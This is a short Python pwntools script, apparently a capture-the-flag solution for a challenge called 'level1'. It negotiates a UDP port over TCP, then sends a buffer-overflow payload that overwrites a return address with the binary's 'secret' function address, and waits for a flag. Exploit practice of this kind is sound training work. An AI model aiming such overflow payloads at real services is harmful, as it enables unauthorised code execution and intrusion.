import socket
from pwn import *
import time

import sys
if (len(sys.argv)<3):
    print "usage: <ip> <port>"
    exit(0)
server = sys.argv[1]
tcp_port = sys.argv[2]

context.update(log_level="DEBUG")
target = ELF("./level1");

conn = remote(server,tcp_port)
conn.sendline("Lv1")
print conn.recvuntil("OK ")
port = conn.recvline()
log.info("Port = "+port)
secret_address=target.symbols["secret"];
prova=0x0000424242424242
sa_packed=p64(secret_address)
print sa_packed
UDP_IP = server
UDP_LOCAL_PORT = int(port)

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # UDP
MESSAGE="-1|-1\n"
sock.sendto(MESSAGE, (UDP_IP, int(port)));
MESSAGE="0|0" + "A"*21 + sa_packed + "\n"
sock.sendto(MESSAGE, (UDP_IP, int(port)));
while True:
    data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
    print "received message:", data
    if "flag" in data:
        print "Challenge working"
        exit(0)

'''

conn.close()
time.sleep(1);
conn = remote('localhost',port, typ="udp")
conn.sendline("-1|-1")
while(1):
    print conn.recvline()
'''
